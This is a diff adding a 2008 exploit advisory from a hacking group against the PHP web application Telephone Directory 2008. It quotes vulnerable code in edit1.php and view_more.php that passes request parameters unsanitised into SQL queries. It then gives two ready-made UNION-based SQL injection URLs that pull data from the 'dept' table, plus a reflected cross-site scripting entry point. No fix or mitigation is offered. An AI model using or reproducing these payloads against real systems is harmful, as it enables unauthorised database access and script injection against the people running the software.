@@ -1,0 +1,70 @@
+====================================================================
+ Telephone Directory 2008 (SQL/XSS) Multiple Remote Vulnerabilities
+====================================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+AUTHOR : CWH Underground
+DATE   : 9 June 2008
+SITE   : www.citec.us
+
+
+#####################################################
+ APPLICATION : Telephone Directory 2008
+ DOWNLOAD    : http://downloads.sourceforge.net/telephone
+#####################################################
+
+---SQL Injection Exploit---
+
+***magic_quotes_gpc = Off***
+
+1. Vulnerable in edit1.php
+##############################################
+Line:
+    23:	if (($code != "") && ($action == "confirm_data"))
+    24:	{
+    25:	$query = "select * from $tele[dir_tbl] where id = '$code'";
+    26:	$query_run = mysql_query($query, $con) or die(mysql_error());
+    27:	$num_rows =  mysql_num_rows($query_run);
+###############################################
+
+Exploit 1:
+
+http://[target]/[path]/edit1.php?action=confirm_data&code=1'/**/UNION/**/SELECT/**/1,name,3,4,5,6,7,8,9,10,11,12/**/FROM/**/dept/**/WHERE/**/ID='HOUS001
+
+
+2. Vulnerable in view_more.php
+##############################################
+Line:
+    5:	$icode = $_GET[id];
+
+    12:	$query = "select name, desgid, deptid, doj, oadd from $tele[dir_tbl] where id = '$icode'";
+    13:	$query_run = mysql_query($query,$con) or die(mysql_error());
+    14:	while($i = mysql_fetch_array($query_run))
+###############################################
+
+Exploit 2:
+
+http://[target]/[path]/view_more.php?id=1'/**/UNION/**/SELECT/**/1,2,3,name,5/**/FROM/**/dept/**/WHERE/**/ID='INTX007812
+
+
+---Reflect XSS Exploit---
+
+http://[target]/[path]/edit1.php?action=<XSS>
+
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-09]
